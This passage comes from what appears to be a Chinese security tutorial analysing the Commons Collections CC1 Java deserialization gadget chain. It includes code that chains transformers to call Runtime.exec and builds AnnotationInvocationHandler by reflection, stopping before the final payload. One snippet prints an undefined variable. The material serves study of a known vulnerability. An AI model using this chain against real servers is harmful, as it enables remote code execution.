<h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>ConstantTransformer是Transformer的一个实现类，这个是CommonsCollections组件内已经实现好的一个类。</p>
<p>我们主要来看看它的transform函数的实现逻辑: <code>org.apache.commons.collections.functors.ConstantTransformer#transform</code></p>
<p>它的逻辑很简单，就直接返回iConstant这个成员属性。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112348008.png" alt="图片"></p>
<p>这个iConstant是什么呢？我们来看看ConstantTransformer的构造函数，构造函数接收一个constantToReturn然后就直接赋值给iConstant。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112356667.png" alt="图片"></p>
<p>那么这个类其实它的作用就是，在构造函数上传什么给它，对应的transform函数就返回什么。那么这里就起来很诡异，这有什么用？其实这个不用太多去纠结，可能在某些业务场景会用到吧！</p>
<p>我们来写一段代码，这里我们定义了2个ConstantTransformer然后分别在构造函数上传递参数<code>123</code>和<code>456</code>。在向<code>transformedMap</code>里<code>put</code>key111<code>和</code>val111&#96;</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(</span><br><span class="line">        map,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;123&quot;</span>),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;456&quot;</span>)</span><br><span class="line">);</span><br><span class="line">transformedMap.put(<span class="string">&quot;key111&quot;</span>, <span class="string">&quot;val111&quot;</span>);</span><br><span class="line"><span class="comment">// &#123;123=456&#125;</span></span><br><span class="line">System.out.println(transformedMap);</span><br></pre></td></tr></table></figure>

<p>打印的结果为<code>123=456</code>，前边已经说过<code>ConstantTransformer</code>就是你在构造函数上传什么，它的处理函数<code>transform()</code>就返回什么，所以在我们<code>put</code>后触发回调函数<code>ConstantTransformer#transform</code>，处理后的结果就是<code>123=456</code>。</p>
<h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>InvokerTransformer也是Transformer接口的一个实现类，它也是CommonCollections组件内已经实现好的一个类。</p>
<p>通过这个InvokerTransformer我们可以来实现函数的调用，先看一下InvokerTransformer的<code>transform()</code>函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">  <span class="comment">// 检验是否为空</span></span><br><span class="line">  <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 获取input这个实例的 类类型</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">    <span class="comment">// 根据iMethodName来获取input这个类里的函数</span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">    <span class="comment">// 通过反射调用这个函数</span></span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, iArgs);   </span><br><span class="line">  &#125; </span><br><span class="line">  <span class="comment">// 异常捕获，我删减了！</span></span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>InvokerTransformer的<code>transform()</code>会根据<code>iMethodName</code>来调用input这个实例对应类里的函数，那么我们继续看一下这个<code>iMethodName</code>是哪来的。</p>
<p>在InvokerTransformer的构造函数里就有接收这个参数，并赋值给成员属性<code>iMethodName</code>。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112434683.png" alt="图片"></p>
<p>那么我们来自定义一个类，然后通过InvokerTransformer来调用自定义类里的函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Print &quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Test</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">  <span class="comment">// Test类中的函数名</span></span><br><span class="line">  <span class="string">&quot;print&quot;</span>,</span><br><span class="line">  <span class="comment">// 参数类型，因为InvokerTransformer构造接收的是数组，所以这里就传递数组</span></span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">  <span class="comment">// 参数值</span></span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;hello&quot;</span>&#125; </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">HashMap</span>(),</span><br><span class="line">  invokerTransformer,</span><br><span class="line">  invokerTransformer</span><br><span class="line">);</span><br><span class="line"><span class="comment">// put元素，TransformedMap将触发InvokerTransformer的transform函数</span></span><br><span class="line">transformedMap.put(test, test);</span><br></pre></td></tr></table></figure>

<p>打印了两次，因为<code>key</code>一次<code>value</code>一次。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112503616.png" alt="图片"></p>
<h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串在⼀起。</p>
<p>通俗来说就是前⼀个Transformer执行的返回结果，作为后⼀个Transformer的参数传⼊。</p>
<p>同样我们来看一下它的<code>transform()</code>函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">    <span class="comment">// 循环遍历这个数组，调用元素的transform函数，并将object作为参数传入。</span></span><br><span class="line">    object = iTransformers[i].transform(object);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们再来看一下iTransformers是哪来的，在ChainedTransformer的构造函数里直接就接收了一个<code>Transformer数组</code>，然后赋值给<code>iTransformer</code>。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112527192.png" alt="图片"></p>
<p>来定义两个Transformer接口的实现类，并通过ChainedTransformer将它们串起来</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Transformer1</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Transformer1&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Transformer2</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> input + <span class="string">&quot;-Transformer2&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个Transformer的transform函数接收到的input是最外层map在put时传入的值。</p>
<p>第二个Transformer的transform函数的参数是第一个Transformer的transform函数的返回值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Transformer1</span>(),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Transformer2</span>()</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">HashMap</span>(),</span><br><span class="line">  chainedTransformer,</span><br><span class="line">  chainedTransformer</span><br><span class="line">);</span><br><span class="line">transformedMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;val&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123;Transformer1-Transformer2=Transformer1-Transformer2&#125;</span></span><br><span class="line">System.out.println(outerMap);</span><br></pre></td></tr></table></figure>

<p>结果为<code>&#123;Transformer1-Transformer2=Transformer1-Transformer2&#125;</code></p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112605383.png" alt="图片"></p>
<p>从执行的结果能看出ChainedTransformer的作用，其实就是按顺序执行<code>Transformer#transform</code>，然后已最后那个<code>Transformer#transform</code>处理的结果为准，返回处理的结果，就像流水线一样每个环节就是一个Transformer然后拼接到一起整合成一个成品。</p>
<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="将Transformer串起来执行"><a href="#将Transformer串起来执行" class="headerlink" title="将Transformer串起来执行"></a>将Transformer串起来执行</h2><ol>
<li><p>ConstantTransformer返回一个Runtime</p>
</li>
<li><p>InvokerTransformer通过反射调用上一个Transformer的返回值也就是Runtime，调用它的exec函数，弹出计算器。</p>
</li>
<li><p>使用ChainedTransformer，存入上边2个Transformer，这样才能串起来。</p>
</li>
<li><p>获取TransformedMap，调用put函数，触发transform回调。</p>
</li>
<li><p>弹出计算器</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">// ConstantTransformer构造函数传什么，在transform函数就返回什么！</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 上边的ConstantTransformer返回的是一个Runtime对象，那么我们这里通过InvokerTransformer来调用Runtime的exec函数，进行命令执行。</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">        )</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造一个ChainedTransformer，将上边的ConstantTransformer和InvokerTransformer串联起来执行。</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">transformedMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112725078.png" alt="图片"></p>
<h1 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h1><p>这里存在一个问题，想要在实战中能触发rce，将构造的Payload数据流发送过去后，目标服务端调用readObject进行反序列化还原对象，&#x3D;&#x3D;将TransformedMap还原后还需要进行一次put动作才能触发transform函数来达到rce效果。&#x3D;&#x3D;</p>
<p>但是很遗憾目前我们构造的这些，它只是一个本地的demo，因为发送到目标服务器后它并不会主动进行一次put动作(当然也有可能代码会在readObject后调用一次put，看运气！)。</p>
<p>那么如果我们在Java中能找到满足以下条件的类，就能进行RCE。</p>
<ol>
<li>类支持序列化操作</li>
<li>重写了readObject函数，并且在readObject函数中调用了我们传入的TransformedMap，并做了put的动作来触发transform函数。</li>
<li>同时又要确保目标服务器上也存在该类，所以最好是JavaJdk中的类。</li>
</ol>
<h1 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h1><p>那么在Java中有一个类<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，这个是属于Java原生库里的类，不需要额外引入依赖。</p>
<p>来看一下这个类的readObject函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">  var1.defaultReadObject();</span><br><span class="line">  <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">    <span class="comment">// 异常抛出，被我删了，简化阅读。</span></span><br><span class="line">    ......</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">  <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">    Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">    <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">    <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">      <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">        <span class="comment">// 注意看这里，这里有一个setValue的动作，实际上我们回想前边TransformedMap的回调函数触发机制，是不是也说明过setValue能触发decorate()的第三个参数的回调函数。</span></span><br><span class="line">        var5.setValue(...).setMember(...);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在代码中我们可以注意到有调用setValue，在最开始介绍TransformedMap时就说过，除了put函数外呢，通过迭代器后调用setValue动作也会触发transform()函数的执行。</p>
<p><code>var5.setValue(...).setMember(......);</code></p>
<p>那么我们只要能将这个var5设为我们自定义的那个TransformedMap对应的迭代器，就可以进行rce。</p>
<p>那么我们先来分析一下var5是哪来的。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112802836.png" alt="图片"></p>
<p>var5来自var4的<code>next()</code>函数，继续跟进看看var4，var4来自memberValues，并且这里是调用了<code>iterator()</code>获取一个迭代器，所以memberValues肯定是一个集合。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112812567.png" alt="图片"></p>
<p>memberValues是在AnnotationInvocationHandler的构造函数传进来的一个map集合。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112822961.png" alt="图片"></p>
<p>那么我们只要构造一个AnnotationInvocationHandler，然后将带有rce调用链的TransformedMap传入AnnotationInvocationHandler的构造函数，这样就能将memberValues赋值为带有恶意攻击的TransformedMap。</p>
<p>然后我们将AnnotationInvocationHandler进行序列化，发送到目标服务器，当目标服务器在反序列化调用readObjet时，就会调用AnnotationInvocationHandler里的readObject，而恰好这个readObject内又调用了memberValues迭代器的setValue函数，那么他就会触发transform函数进行利用链的指向。</p>
<p>有了思路后，我们就来实例化AnnotationInvocationHandler这个类，但是这个类的构造函数是私有的，所以我们这里需要通过Java的反射才能获取到这个类的实例。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"><span class="comment">// 设置这一行才能访问私有的</span></span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 这里的transformedMap就是我们最开始分析的那个</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">expObj</span> <span class="operator">=</span> construct.newInstance(Retention.class, transformedMap);</span><br></pre></td></tr></table></figure>

<p>这里我们注意到构造函数上还传了一个<code>Retention.class</code>的东西，我们回到AnnotationInvocationHandler的构造函数逻辑来看一下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">  Class[] var3 = var1.getInterfaces();</span><br><span class="line">  <span class="comment">// 这里要求var1必须是一个注解，同时接口长度只能为1，并且要求第一个接口为Annotation</span></span><br><span class="line">  <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">    <span class="comment">// 满足条件后会存入this.type这个成员属性里</span></span><br><span class="line">    <span class="built_in">this</span>.type = var1;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实那个if就是在校验var1是不是一个注解，当然这里的逻辑实际上随便传一个符合这个条件的注解就可以了。这样我们就能构造一个AnnotationInvocationHandler的实例了。</p>
<p>但是别急，我们回到AnnotationInvocationHandler的readObject函数，来分析一下var7，这个前边没有讲到。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var1.defaultReadObject();</span><br><span class="line"><span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line"><span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">  Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">  <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">  <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">  <span class="comment">// 注意看这里，这里还有一个判断，如果var7为null，那么我们就无法进入到setValue，也就无法触发transform()。</span></span><br><span class="line">  <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">    var5.setValue(......);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么来分析一下这个var7是哪里来的</p>
<ol>
<li><p>var7 是通过<code>var3.get(var6)</code>获得</p>
</li>
<li><p>var3 为<code>var2.memberTypes();</code></p>
</li>
<li><p>var2 为<code>AnnotationType.getInstance(this.type); </code>这里的this.type实际上就是前边构造函数赋值的那个<code>Retention.class</code>。然后得到一个AnnotationType</p>
</li>
<li><p>往回推，看<code>var2.memberTypes();</code>得到的结果是一个map并且赋值给了var3</p>
</li>
<li><p>来看一下var3这个map里存的是什么值，其实就是一个键值对<code>&#123;value=class java.lang.annotation.RetentionPolicy&#125;</code>，键是<code>value</code>，值是<code>class java.lang.annotation.RetentionPolicy</code></p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">AnnotationType</span> <span class="variable">instance</span> <span class="operator">=</span> AnnotationType.getInstance(Retention.class);</span><br><span class="line">System.out.println(instance.memberTypes());</span><br></pre></td></tr></table></figure>

<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112922215.png" alt="图片"></p>
<ol start="6">
<li><p>再回来看var7，var7是从var3.get(var6)中获得到的，并且随后进行了<code>var7 != null</code>的判断，那么这里var3我们已经知道他里边存储的键值对是<code>&#123;value=class java.lang.annotation.RetentionPolicy&#125;</code>，所以这里只需要能让<code>var3.get(&quot;value&quot;)</code>达到这样的效果，那么var7就不会为null。</p>
</li>
<li><p>那么var3.get()又是根据var6来的，看下边分析。</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 而var4这个迭代器其实就是this.memberValues，而this.memberValues其实就是TransformedMap。</span></span><br><span class="line"><span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">  <span class="comment">// var5呢就是var4这个迭代器输出的一个键值对包装类Map.Entry</span></span><br><span class="line">  Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">  <span class="comment">// var6实际上就是var5这个键值对里的键</span></span><br><span class="line">  <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>所以我们只需要在TransformedMap里存一个键值对为<code>value=xxx</code>的，就可以让<code>var7 != null</code>成立。从而进入执行setValue的代码</li>
</ol>
<h1 id="完整的Exp"><a href="#完整的Exp" class="headerlink" title="完整的Exp"></a>完整的Exp</h1><p>通过上边的分析后，我们只需要将所有的利用给串起来，最后生成AnnotationInvocationHandler的序列化数据即可。</p>
